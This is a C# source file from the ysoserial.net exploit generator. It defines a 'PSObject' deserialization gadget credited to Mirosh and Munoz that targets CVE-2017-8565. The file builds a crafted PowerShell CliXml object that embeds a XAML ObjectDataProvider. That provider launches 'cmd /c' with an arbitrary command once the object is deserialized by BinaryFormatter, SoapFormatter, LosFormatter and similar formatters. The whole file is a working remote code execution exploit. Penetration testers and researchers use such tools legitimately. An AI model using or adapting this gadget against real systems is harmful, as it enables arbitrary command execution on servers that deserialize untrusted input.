using System;
using System.Runtime.Serialization;
using System.Management.Automation;
using System.Collections.Generic;

namespace ysoserial.Generators
{
    [Serializable]
    public class PsObjectMarshal : ISerializable
    {
        protected PsObjectMarshal(SerializationInfo info, StreamingContext context)
        {

        }

        string _xml;
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            Type typePso = typeof(PSObject);
            info.SetType(typePso);
            info.AddValue("CliXml", _xml);
        }
        public PsObjectMarshal(string xml)
        {
            _xml = xml;
        }
    }

    class PSObjectGenerator : GenericGenerator
    {
        public override string Name()
        {
            return "PSObject";
        }

        public override string Description()
        {
            return "PSObject Gadget by Oleksandr Mirosh and Alvaro Munoz. Target must run a system not patched for CVE-2017-8565 (Published: 07/11/2017)";
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "SoapFormatter", "NetDataContractSerializer", "LosFormatter" };
        }

        public override object Generate(string cmd, string formatter, Boolean test)
        {
            string clixml = @"
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04"">&#xD;
<Obj RefId=""0"">&#xD;
    <TN RefId=""0"">&#xD;
      <T>Microsoft.Management.Infrastructure.CimInstance#System.Management.Automation/RunspaceInvoke5</T>&#xD;
      <T>Microsoft.Management.Infrastructure.CimInstance#RunspaceInvoke5</T>&#xD;
      <T>Microsoft.Management.Infrastructure.CimInstance</T>&#xD;
      <T>System.Object</T>&#xD;
    </TN>&#xD;
    <ToString>RunspaceInvoke5</ToString>&#xD;
    <Obj RefId=""1"">&#xD;
      <TNRef RefId=""0"" />&#xD;
      <ToString>RunspaceInvoke5</ToString>&#xD;
      <Props>&#xD;
        <Nil N=""PSComputerName"" />&#xD;
		<Obj N=""test1"" RefId =""20"" > &#xD;
          <TN RefId=""1"" > &#xD;
            <T>System.Windows.Markup.XamlReader[], PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35</T>&#xD;
            <T>System.Array</T>&#xD;
            <T>System.Object</T>&#xD;
          </TN>&#xD;
          <LST>&#xD;
            <S N=""Hash"" >  
		&lt;ResourceDictionary
  xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
  xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
  xmlns:System=""clr-namespace:System;assembly=mscorlib""
  xmlns:Diag=""clr-namespace:System.Diagnostics;assembly=system""&gt;
	 &lt;ObjectDataProvider x:Key=""LaunchCalc"" ObjectType = ""{ x:Type Diag:Process}"" MethodName = ""Start"" &gt;
     &lt;ObjectDataProvider.MethodParameters&gt;
        &lt;System:String&gt;cmd&lt;/System:String&gt;
        &lt;System:String&gt;/c """ + cmd + @""" &lt;/System:String&gt;
     &lt;/ObjectDataProvider.MethodParameters&gt;
    &lt;/ObjectDataProvider&gt;
&lt;/ResourceDictionary&gt;
			</S>&#xD;
          </LST>&#xD;
        </Obj>&#xD;
      </Props>&#xD;
      <MS>&#xD;
        <Obj N=""__ClassMetadata"" RefId =""2""> &#xD;
          <TN RefId=""1"" > &#xD;
            <T>System.Collections.ArrayList</T>&#xD;
            <T>System.Object</T>&#xD;
          </TN>&#xD;
          <LST>&#xD;
            <Obj RefId=""3""> &#xD;
              <MS>&#xD;
                <S N=""ClassName"">RunspaceInvoke5</S>&#xD;
                <S N=""Namespace"">System.Management.Automation</S>&#xD;
                <Nil N=""ServerName"" />&#xD;
                <I32 N=""Hash"">460929192</I32>&#xD;
                <S N=""MiXml""> &lt;CLASS NAME=""RunspaceInvoke5"" &gt;&lt;PROPERTY NAME=""test1"" TYPE =""string"" &gt;&lt;/PROPERTY&gt;&lt;/CLASS&gt;</S>&#xD;
              </MS>&#xD;
            </Obj>&#xD;
          </LST>&#xD;
        </Obj>&#xD;
      </MS>&#xD;
    </Obj>&#xD;
    <MS>&#xD;
      <Ref N=""__ClassMetadata"" RefId =""2"" />&#xD;
    </MS>&#xD;
  </Obj>&#xD;
</Objs>";
            PsObjectMarshal payload = new PsObjectMarshal(clixml);
            return Serialize(payload, formatter, test);
        }

    }
}
